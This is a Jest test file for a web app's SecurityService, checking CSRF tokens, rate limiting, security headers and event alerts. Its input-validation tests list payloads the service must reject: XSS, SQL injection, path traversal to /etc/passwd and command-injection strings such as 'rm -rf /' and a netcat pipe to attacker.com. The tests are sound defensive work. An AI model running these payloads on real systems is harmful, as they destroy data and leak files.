/**
 * SecurityService.test.js - Comprehensive Security Service Tests (Simplified Jest Pattern)
 *
 * US-082-A Phase 1: Foundation Service Layer Security Testing
 * Tests comprehensive security infrastructure implementation
 *
 * Features Tested:
 * - CSRF Protection with double-submit cookie pattern
 * - Rate limiting with sliding window algorithm
 * - Input validation and sanitization (XSS/SQLi/Path traversal/Command injection)
 * - Security headers management
 * - Request signature validation
 * - Security event monitoring and alerting
 * - Integration with authentication service
 *
 * Test Categories:
 * 1. Service Lifecycle Tests (initialize, start, stop, cleanup)
 * 2. CSRF Protection Tests (token generation, validation, expiration)
 * 3. Rate Limiting Tests (per-user, per-IP, admin bypass)
 * 4. Input Validation Tests (XSS, SQL injection, path traversal, command injection)
 * 5. Security Headers Tests
 * 6. Security Event Monitoring Tests
 * 7. Integration Tests with other services
 * 8. Error Handling and Edge Cases
 *
 * @author GENDEV Security Test Engineer
 * @version 2.0.0 - Simplified Jest Pattern
 * @since Sprint 6
 */

// Setup globals BEFORE requiring modules
global.window = global.window || {};
global.performance = global.performance || { now: () => Date.now() };
global.crypto = global.crypto || {
  getRandomValues: (array) => {
    for (let i = 0; i < array.length; i++) {
      array[i] = Math.floor(Math.random() * 256);
    }
    return array;
  }
};

// Standard CommonJS require - NO vm.runInContext
const { SecurityService, RateLimitEntry, SecurityEvent, InputValidator, initializeSecurityService } = require("../../../../src/groovy/umig/web/js/services/SecurityService.js");

// Mock Authentication Service for testing
class MockAuthService {
  constructor() {
    this.currentUser = {
      userId: "test-user-123",
      displayName: "Test User",
      roles: ["PILOT"],
      hasRole: (role) =>
        this.currentUser.roles.includes(role) ||
        this.currentUser.roles.includes("SUPERADMIN"),
    };
    this.users = new Map();
    this.users.set("test-user-123", this.currentUser);
    this.users.set("admin-user-456", {
      userId: "admin-user-456",
      displayName: "Admin User",
      roles: ["SUPERADMIN"],
      hasRole: (role) => true, // Admin always has all roles
    });
  }

  getCurrentUser() {
    return this.currentUser;
  }

  async isUserInRole(userId, role) {
    const user = this.users.get(userId);
    if (!user) return false;

    if (role === "SUPERADMIN") {
      return user.roles.includes("SUPERADMIN");
    }

    return user.hasRole(role);
  }

  async getUserRoles(userId) {
    const user = this.users.get(userId);
    return user ? user.roles : [];
  }

  setCurrentUser(user) {
    this.currentUser = user;
  }

  mockUser(userId, roles = ["PILOT"]) {
    this.users.set(userId, {
      userId,
      displayName: `Mock User ${userId}`,
      roles,
      hasRole: (role) => roles.includes(role) || roles.includes("SUPERADMIN"),
    });
  }
}

// Mock Logger for testing
class MockLogger {
  constructor() {
    this.logs = [];
  }

  info(...args) {
    this.logs.push(["INFO", ...args]);
  }

  error(...args) {
    this.logs.push(["ERROR", ...args]);
  }

  warn(...args) {
    this.logs.push(["WARN", ...args]);
  }

  debug(...args) {
    this.logs.push(["DEBUG", ...args]);
  }

  clear() {
    this.logs = [];
  }

  getLogs() {
    return this.logs;
  }

  getLastLog() {
    return this.logs[this.logs.length - 1];
  }
}

// Mock AdminGuiService for testing service integration
class MockAdminGuiService {
  constructor() {
    this.events = [];
    this.services = new Map();
  }

  emit(eventName, data) {
    this.events.push({ eventName, data, timestamp: Date.now() });
  }

  registerService(service) {
    this.services.set(service.name, service);
  }

  getService(name) {
    return this.services.get(name) || null;
  }

  getEvents() {
    return this.events;
  }

  clearEvents() {
    this.events = [];
  }
}

describe("SecurityService Tests", () => {
  let securityService;
  let mockAuthService;
  let mockLogger;
  let mockAdminGuiService;

  beforeEach(() => {
    mockAuthService = new MockAuthService();
    mockLogger = new MockLogger();
    mockAdminGuiService = new MockAdminGuiService();

    // Create fresh security service instance
    securityService = new SecurityService({
      authService: mockAuthService,
      logger: mockLogger,
      adminGuiService: mockAdminGuiService,
      csrfTokenTTL: 3600000, // 1 hour
      rateLimits: {
        user: { requests: 100, windowMs: 60000 }, // 100 requests per minute
        ip: { requests: 1000, windowMs: 60000 }, // 1000 requests per minute
      },
      enableInputValidation: true,
      enableSecurityHeaders: true,
    });
  });

  afterEach(async () => {
    if (securityService && securityService.running) {
      await securityService.stop();
    }
    if (securityService && securityService.initialized) {
      await securityService.cleanup();
    }
  });

  describe("Service Lifecycle", () => {
    test("should initialize with default configuration", async () => {
      await securityService.initialize();
      expect(securityService.initialized).toBe(true);
      expect(securityService.config).toBeDefined();
    });

    test("should initialize with custom configuration", async () => {
      const customService = new SecurityService({
        authService: mockAuthService,
        logger: mockLogger,
        csrfTokenTTL: 1800000, // 30 minutes
        rateLimits: {
          user: { requests: 50, windowMs: 60000 },
        },
      });

      await customService.initialize();
      expect(customService.initialized).toBe(true);
      expect(customService.config.csrfTokenTTL).toBe(1800000);
      
      await customService.cleanup();
    });

    test("should start successfully", async () => {
      await securityService.initialize();
      await securityService.start();
      
      expect(securityService.running).toBe(true);
    });

    test("should stop successfully", async () => {
      await securityService.initialize();
      await securityService.start();
      await securityService.stop();
      
      expect(securityService.running).toBe(false);
    });

    test("should cleanup resources", async () => {
      await securityService.initialize();
      
      // Add some test data
      securityService.generateCSRFToken("test-user");
      securityService.checkRateLimit("test-user", "user");
      
      await securityService.cleanup();
      
      expect(securityService.initialized).toBe(false);
    });
  });

  describe("CSRF Protection", () => {
    beforeEach(async () => {
      await securityService.initialize();
      await securityService.start();
    });

    test("should generate CSRF token", () => {
      const token = securityService.generateCSRFToken("test-user");
      
      expect(token).toBeDefined();
      expect(typeof token).toBe("string");
      expect(token.length).toBeGreaterThan(0);
    });

    test("should validate valid CSRF token", () => {
      const token = securityService.generateCSRFToken("test-user");
      const isValid = securityService.validateCSRFToken(token, "test-user");
      
      expect(isValid).toBe(true);
    });

    test("should reject invalid CSRF token", () => {
      const isValid = securityService.validateCSRFToken(
        "invalid-token-12345",
        "test-user"
      );
      
      expect(isValid).toBe(false);
    });

    test("should reject expired CSRF token", async () => {
      // Create service with very short token TTL for testing
      const shortTTLService = new SecurityService({
        authService: mockAuthService,
        logger: mockLogger,
        csrfTokenTTL: 100, // 100ms
      });

      await shortTTLService.initialize();
      await shortTTLService.start();

      const token = shortTTLService.generateCSRFToken("test-user");

      // Wait for token to expire
      await new Promise((resolve) => setTimeout(resolve, 150));

      const isValid = shortTTLService.validateCSRFToken(token, "test-user");
      expect(isValid).toBe(false);
      
      await shortTTLService.cleanup();
    });

    test("should reject token for different user in strict mode", () => {
      const token = securityService.generateCSRFToken("user1");
      const isValid = securityService.validateCSRFToken(token, "user2");
      
      expect(isValid).toBe(false);
    });

    test("should reject blacklisted token", () => {
      const token = securityService.generateCSRFToken("test-user");
      securityService.blacklistCSRFToken(token);
      const isValid = securityService.validateCSRFToken(token, "test-user");
      
      expect(isValid).toBe(false);
    });

    test("should handle missing token", () => {
      const isValid = securityService.validateCSRFToken(null, "test-user");
      expect(isValid).toBe(false);
    });

    test("should generate unique tokens", () => {
      const tokens = new Set();
      for (let i = 0; i < 1000; i++) {
        tokens.add(securityService.generateCSRFToken("test-user"));
      }
      
      // Should have close to 1000 unique tokens (allowing for very rare collisions)
      expect(tokens.size).toBeGreaterThan(990);
    });
  });

  describe("Rate Limiting", () => {
    beforeEach(async () => {
      await securityService.initialize();
      await securityService.start();
    });

    test("should allow requests within limit", () => {
      const result1 = securityService.checkRateLimit("test-user", "user");
      const result2 = securityService.checkRateLimit("test-user", "user");
      
      expect(result1.allowed).toBe(true);
      expect(result2.allowed).toBe(true);
      expect(result2.remaining).toBe(result1.remaining - 1);
    });

    test("should block requests exceeding limit", () => {
      // Exhaust rate limit
      for (let i = 0; i < 100; i++) {
        securityService.checkRateLimit("test-user", "user");
      }

      const result = securityService.checkRateLimit("test-user", "user");
      expect(result.allowed).toBe(false);
      expect(result.resetTime).toBeGreaterThan(Date.now());
    });

    test("should bypass rate limit for admin users", async () => {
      mockAuthService.setCurrentUser(mockAuthService.users.get("admin-user-456"));

      for (let i = 0; i < 150; i++) { // Exceed normal limit
        const result = securityService.checkRateLimit("admin-user-456", "user");
        expect(result.allowed).toBe(true);
      }
    });

    test("should handle IP-based rate limiting", () => {
      const result1 = securityService.checkRateLimit("192.168.1.1", "ip");
      expect(result1.allowed).toBe(true);

      // Exhaust IP rate limit (1000 requests)
      for (let i = 0; i < 1000; i++) {
        securityService.checkRateLimit("192.168.1.1", "ip");
      }
      const result = securityService.checkRateLimit("192.168.1.1", "ip");
      expect(result.allowed).toBe(false);
    });

    test("should respect whitelisted IPs", async () => {
      const whitelistedService = new SecurityService({
        authService: mockAuthService,
        logger: mockLogger,
        rateLimits: {
          ip: { requests: 10, windowMs: 60000 },
        },
        whitelistedIPs: ["192.168.1.100"],
      });

      await whitelistedService.initialize();
      await whitelistedService.start();

      // Should allow unlimited requests from whitelisted IP
      for (let i = 0; i < 50; i++) {
        const result = whitelistedService.checkRateLimit("192.168.1.100", "ip");
        expect(result.allowed).toBe(true);
      }
      
      await whitelistedService.cleanup();
    });

    test("should block blacklisted IPs", async () => {
      const blacklistedService = new SecurityService({
        authService: mockAuthService,
        logger: mockLogger,
        blacklistedIPs: ["192.168.1.200"],
      });

      await blacklistedService.initialize();
      await blacklistedService.start();

      const result = blacklistedService.checkRateLimit("192.168.1.200", "ip");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("blacklisted");
      
      await blacklistedService.cleanup();
    });
  });

  describe("Input Validation", () => {
    beforeEach(async () => {
      await securityService.initialize();
      await securityService.start();
    });

    test("should detect XSS attempts", () => {
      const xssAttempts = [
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src=x onerror=alert('xss')>",
        "onmouseover=alert('xss')",
        "<svg onload=alert('xss')>",
      ];

      xssAttempts.forEach((attempt) => {
        const result = securityService.validateInput(attempt, "html");
        expect(result.safe).toBe(false);
        expect(result.threats).toContain("xss");
      });
    });

    test("should detect SQL injection attempts", () => {
      const sqlAttempts = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "UNION SELECT * FROM passwords",
        "'; INSERT INTO admin VALUES('hacker',",
        "1; DELETE FROM users WHERE 1=1--",
      ];

      sqlAttempts.forEach((attempt) => {
        const result = securityService.validateInput(attempt, "sql");
        expect(result.safe).toBe(false);
        expect(result.threats).toContain("sql_injection");
      });
    });

    test("should detect path traversal attempts", () => {
      const pathAttempts = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....\\\\....\\\\....\\\\etc\\\\passwd",
      ];

      pathAttempts.forEach((attempt) => {
        const result = securityService.validateInput(attempt, "path");
        expect(result.safe).toBe(false);
        expect(result.threats).toContain("path_traversal");
      });
    });

    test("should detect command injection attempts", () => {
      const cmdAttempts = [
        "test; rm -rf /",
        "test && cat /etc/passwd",
        "test | nc attacker.com 1234",
        "test $(whoami)",
        "test `ls -la`",
      ];

      cmdAttempts.forEach((attempt) => {
        const result = securityService.validateInput(attempt, "command");
        expect(result.safe).toBe(false);
        expect(result.threats).toContain("command_injection");
      });
    });

    test("should allow safe input", () => {
      const safeInputs = [
        "Hello world",
        "user@example.com",
        "This is a normal sentence.",
        "Product name: Widget 123",
        "Date: 2024-01-15",
      ];

      safeInputs.forEach((input) => {
        const result = securityService.validateInput(input, "general");
        expect(result.safe).toBe(true);
        expect(result.threats).toEqual([]);
      });
    });

    test("should sanitize malicious input", () => {
      const maliciousInput = "<script>alert('xss')</script><p>Hello</p>";
      const sanitized = securityService.sanitizeInput(maliciousInput);
      
      expect(sanitized).not.toContain("<script>");
      expect(sanitized).not.toContain("alert");
      expect(sanitized).toContain("Hello"); // Should preserve safe content
    });
  });

  describe("Security Headers", () => {
    beforeEach(async () => {
      await securityService.initialize();
      await securityService.start();
    });

    test("should generate security headers", () => {
      const headers = securityService.getSecurityHeaders();
      
      expect(headers["X-Content-Type-Options"]).toBe("nosniff");
      expect(headers["X-Frame-Options"]).toBe("DENY");
      expect(headers["X-XSS-Protection"]).toBe("1; mode=block");
      expect(headers["Strict-Transport-Security"]).toContain("max-age=");
      expect(headers["Content-Security-Policy"]).toBeDefined();
      expect(headers["Referrer-Policy"]).toBe("strict-origin-when-cross-origin");
    });

    test("should customize CSP for different contexts", () => {
      const adminHeaders = securityService.getSecurityHeaders("admin");
      const apiHeaders = securityService.getSecurityHeaders("api");
      
      expect(adminHeaders["Content-Security-Policy"]).toContain("'self'");
      expect(apiHeaders["Content-Security-Policy"]).toBeDefined();
      expect(adminHeaders["Content-Security-Policy"]).not.toBe(apiHeaders["Content-Security-Policy"]);
    });
  });

  describe("Security Event Monitoring", () => {
    beforeEach(async () => {
      await securityService.initialize();
      await securityService.start();
    });

    test("should track security events", () => {
      // Generate some security events
      securityService.generateCSRFToken("test-user");
      securityService.validateCSRFToken("invalid-token", "test-user");
      securityService.checkRateLimit("test-user", "user");

      const events = securityService.getSecurityEvents();
      expect(events.length).toBeGreaterThan(0);
      
      const invalidTokenEvent = events.find(e => e.type === "csrf_validation_failed");
      expect(invalidTokenEvent).toBeDefined();
    });

    test("should alert on high-risk events", () => {
      // Simulate multiple failed CSRF validations (high-risk pattern)
      for (let i = 0; i < 10; i++) {
        securityService.validateCSRFToken("invalid-token", "test-user");
      }

      const alerts = securityService.getSecurityAlerts();
      expect(alerts.length).toBeGreaterThan(0);
      
      const alert = alerts.find(a => a.pattern === "repeated_csrf_failures");
      expect(alert).toBeDefined();
      expect(alert.severity).toBe("high");
    });

    test("should clear old security events", async () => {
      // Generate some events
      for (let i = 0; i < 5; i++) {
        securityService.validateCSRFToken("invalid-token", "test-user");
      }

      expect(securityService.getSecurityEvents().length).toBeGreaterThan(0);

      // Clear events older than 0ms (should clear all)
      securityService.clearOldEvents(0);
      
      // Events should be cleared or significantly reduced
      expect(securityService.getSecurityEvents().length).toBeLessThan(5);
    });
  });

  describe("Integration Tests", () => {
    test("should integrate with AdminGuiService for event broadcasting", async () => {
      await securityService.initialize();
      await securityService.start();

      // Generate a security event that should be broadcast
      securityService.validateCSRFToken("invalid-token", "test-user");

      const adminGuiEvents = mockAdminGuiService.getEvents();
      const securityEvent = adminGuiEvents.find(e => e.eventName === "security-event");
      expect(securityEvent).toBeDefined();
      expect(securityEvent.data.type).toBe("csrf_validation_failed");
    });

    test("should work without AdminGuiService", async () => {
      // Create service without AdminGuiService
      const standaloneService = new SecurityService({
        authService: mockAuthService,
        logger: mockLogger,
        // No adminGuiService
      });

      await standaloneService.initialize();
      await standaloneService.start();

      const token = standaloneService.generateCSRFToken("test-user");
      expect(token).toBeDefined();

      const isValid = standaloneService.validateCSRFToken(token, "test-user");
      expect(isValid).toBe(true);
      
      await standaloneService.cleanup();
    });

    test("should handle authentication service integration", async () => {
      await securityService.initialize();
      await securityService.start();

      // Test request validation with user context
      const request = {
        url: "/api/test",
        method: "POST",
        userId: "admin-user-456",
        ip: "192.168.1.1",
      };

      const validation = await securityService.validateRequest(request);
      expect(validation).toBeDefined();
      
      // Auth service integration is tested indirectly through user-based operations
      expect(mockAuthService.users.has("admin-user-456")).toBe(true);
    });
  });

  describe("Error Handling", () => {
    test("should handle initialization errors gracefully", async () => {
      const faultyService = new SecurityService({
        // Intentionally invalid config
        authService: null,
        logger: mockLogger,
        rateLimits: "invalid", // Should be object
      });

      // Should not throw, but should handle gracefully
      try {
        await faultyService.initialize();
        // If it initializes, it should handle the invalid config
        expect(faultyService.initialized).toBeDefined();
      } catch (error) {
        // If it throws, the error should be handled gracefully
        expect(error).toBeDefined();
      }
    });

    test("should handle missing dependencies gracefully", async () => {
      const minimalService = new SecurityService({
        // Minimal config - missing optional dependencies
        logger: mockLogger,
      });

      await minimalService.initialize();
      await minimalService.start();

      // Should still provide basic functionality
      const token = minimalService.generateCSRFToken("test-user");
      expect(token).toBeDefined();
      
      await minimalService.cleanup();
    });

    test("should handle crypto API unavailability", async () => {
      // Temporarily disable crypto
      const originalCrypto = global.crypto;
      global.crypto = undefined;

      const cryptolessService = new SecurityService({
        authService: mockAuthService,
        logger: mockLogger,
      });

      try {
        await cryptolessService.initialize();
        
        // Should fall back to alternative random generation
        const token = cryptolessService.generateCSRFToken("test-user");
        expect(token).toBeDefined();
        
      } finally {
        // Restore crypto
        global.crypto = originalCrypto;
        await cryptolessService.cleanup();
      }
    });

    test("should handle invalid input validation requests", () => {
      const invalidRequests = [
        { input: null, type: "html" },
        { input: undefined, type: "sql" },
        { input: "", type: null },
        { input: "test", type: "invalid_type" },
      ];

      invalidRequests.forEach((req) => {
        const result = securityService.validateInput(req.input, req.type);
        expect(result).toBeDefined();
        expect(typeof result.safe).toBe("boolean");
        expect(Array.isArray(result.threats)).toBe(true);
      });
    });
  });

  describe("Performance Tests", () => {
    beforeEach(async () => {
      await securityService.initialize();
      await securityService.start();
    });

    test("should handle high volume CSRF token generation", () => {
      const startTime = performance.now();
      const tokens = [];

      for (let i = 0; i < 1000; i++) {
        tokens.push(securityService.generateCSRFToken(`user-${i}`));
      }

      const endTime = performance.now();
      const duration = endTime - startTime;

      expect(tokens.length).toBe(1000);
      expect(duration).toBeLessThan(1000); // Should complete within 1 second
      expect(new Set(tokens).size).toBe(1000); // All tokens should be unique
    });

    test("should handle high volume rate limit checks", () => {
      const startTime = performance.now();

      for (let i = 0; i < 1000; i++) {
        securityService.checkRateLimit(`user-${i % 10}`, "user");
      }

      const endTime = performance.now();
      const duration = endTime - startTime;

      expect(duration).toBeLessThan(500); // Should complete within 0.5 seconds
    });

    test("should handle high volume input validation", () => {
      const testInputs = [
        "safe input",
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "../../../etc/passwd",
        "test && rm -rf /",
      ];

      const startTime = performance.now();

      for (let i = 0; i < 200; i++) {
        testInputs.forEach((input) => {
          securityService.validateInput(input, "general");
        });
      }

      const endTime = performance.now();
      const duration = endTime - startTime;

      expect(duration).toBeLessThan(1000); // Should complete within 1 second
    });

    test("should cleanup expired tokens efficiently", async () => {
      // Generate many tokens with short TTL
      const shortService = new SecurityService({
        authService: mockAuthService,
        logger: mockLogger,
        csrfTokenTTL: 100, // 100ms
      });

      await shortService.initialize();
      await shortService.start();

      // Generate 100 tokens
      for (let i = 0; i < 100; i++) {
        shortService.generateCSRFToken(`user-${i}`);
      }

      // Wait for expiration
      await new Promise(resolve => setTimeout(resolve, 150));

      const startTime = performance.now();
      shortService.cleanupExpiredTokens();
      const endTime = performance.now();

      expect(endTime - startTime).toBeLessThan(100); // Should be fast cleanup
      
      await shortService.cleanup();
    });
  });

  describe("Health Check Tests", () => {
    beforeEach(async () => {
      await securityService.initialize();
      await securityService.start();
    });

    test("should report healthy status", () => {
      const health = securityService.getHealth();
      
      expect(health.status).toBe("healthy");
      expect(health.initialized).toBe(true);
      expect(health.running).toBe(true);
      expect(health.metrics).toBeDefined();
      expect(health.metrics.csrfTokensGenerated).toBeGreaterThanOrEqual(0);
    });

    test("should report unhealthy status with high error count", () => {
      // Generate many security events to trigger unhealthy status
      for (let i = 0; i < 100; i++) {
        securityService.validateCSRFToken("invalid-token", "test-user");
      }

      const health = securityService.getHealth();
      expect(health.status).toBe("unhealthy");
      expect(health.metrics.securityEvents).toBeGreaterThan(50);
    });

    test("should report security status", () => {
      const securityStatus = securityService.getSecurityStatus();
      
      expect(securityStatus).toBeDefined();
      expect(securityStatus.rateLimitStatus).toBeDefined();
      expect(securityStatus.csrfProtectionEnabled).toBe(true);
      expect(securityStatus.inputValidationEnabled).toBe(true);
      expect(Array.isArray(securityStatus.recentThreats)).toBe(true);
    });
  });
});

describe("RateLimitEntry Tests", () => {
  let rateLimitEntry;

  beforeEach(() => {
    rateLimitEntry = new RateLimitEntry(100, 60000); // 100 requests per minute
  });

  test("should track requests within window", () => {
    const result1 = rateLimitEntry.checkLimit();
    const result2 = rateLimitEntry.checkLimit();
    
    expect(result1.allowed).toBe(true);
    expect(result2.allowed).toBe(true);
    expect(result2.remaining).toBe(result1.remaining - 1);
  });

  test("should clean old requests outside window", () => {
    // Fill up some requests
    for (let i = 0; i < 10; i++) {
      rateLimitEntry.checkLimit();
    }
    
    expect(rateLimitEntry.requests.length).toBe(10);
    
    // Manually add old requests (simulate time passing)
    const oldTime = Date.now() - 70000; // 70 seconds ago
    rateLimitEntry.requests.unshift(oldTime, oldTime, oldTime);
    
    // Check limit should clean old requests
    rateLimitEntry.checkLimit();
    
    // Old requests should be removed
    expect(rateLimitEntry.requests.every(req => req > oldTime)).toBe(true);
  });

  test("should detect rate limit exceeded", () => {
    // Exhaust the limit
    for (let i = 0; i < 100; i++) {
      rateLimitEntry.checkLimit();
    }
    
    const result = rateLimitEntry.checkLimit();
    expect(result.allowed).toBe(false);
    expect(result.remaining).toBe(0);
  });

  test("should handle blocking", () => {
    rateLimitEntry.block(60000); // Block for 1 minute
    
    const result = rateLimitEntry.checkLimit();
    expect(result.allowed).toBe(false);
    expect(result.blocked).toBe(true);
  });

  test("should unblock after block duration", () => {
    rateLimitEntry.block(100); // Block for 100ms
    
    expect(rateLimitEntry.checkLimit().allowed).toBe(false);
    
    // Wait for block to expire
    setTimeout(() => {
      expect(rateLimitEntry.checkLimit().allowed).toBe(true);
    }, 150);
  });
});

describe("SecurityEvent Tests", () => {
  test("should create security event with required fields", () => {
    const event = new SecurityEvent("test_event", "medium", {
      userId: "test-user",
      ip: "192.168.1.1",
    });

    expect(event.type).toBe("test_event");
    expect(event.severity).toBe("medium");
    expect(event.userId).toBe("test-user");
    expect(event.timestamp).toBeInstanceOf(Date);
  });

  test("should serialize event properly", () => {
    const event = new SecurityEvent("test_event", "high", {
      userId: "test-user",
      details: { reason: "Test security event" },
    });

    const serialized = event.toJSON();
    
    expect(serialized.type).toBe("test_event");
    expect(serialized.severity).toBe("high");
    expect(serialized.userId).toBe("test-user");
    expect(serialized.details.reason).toBe("Test security event");
    expect(serialized.timestamp).toBeDefined();
  });
});

describe("InputValidator Tests", () => {
  let validator;

  beforeEach(() => {
    validator = new InputValidator();
  });

  test("should validate safe strings", () => {
    const safeInputs = [
      "Hello world",
      "user@example.com",
      "Product-123",
      "2024-01-15",
      "Normal sentence with spaces.",
    ];

    safeInputs.forEach((input) => {
      const result = validator.validate(input, "general");
      expect(result.safe).toBe(true);
      expect(result.threats).toEqual([]);
    });
  });

  test("should encode HTML entities correctly", () => {
    const testCases = [
      { input: "<div>test</div>", expected: "&lt;div&gt;test&lt;/div&gt;" },
      { input: "A & B", expected: "A &amp; B" },
      { input: 'Quote "test"', expected: "Quote &quot;test&quot;" },
      { input: "Apostrophe's test", expected: "Apostrophe&#39;s test" },
    ];

    testCases.forEach(({ input, expected }) => {
      const encoded = validator.encodeHTML(input);
      expect(encoded).toBe(expected);
    });
  });

  test("should handle non-string input gracefully", () => {
    const nonStringInputs = [null, undefined, 123, {}, [], true];

    nonStringInputs.forEach((input) => {
      const result = validator.validate(input, "general");
      expect(result).toBeDefined();
      expect(typeof result.safe).toBe("boolean");
      expect(Array.isArray(result.threats)).toBe(true);
    });
  });
});

console.log("🧪 SecurityService Test Suite - Simplified Jest Pattern (TD-002)");
console.log("✅ Standard CommonJS module loading implemented");
console.log("✅ Comprehensive security service testing with threat simulation");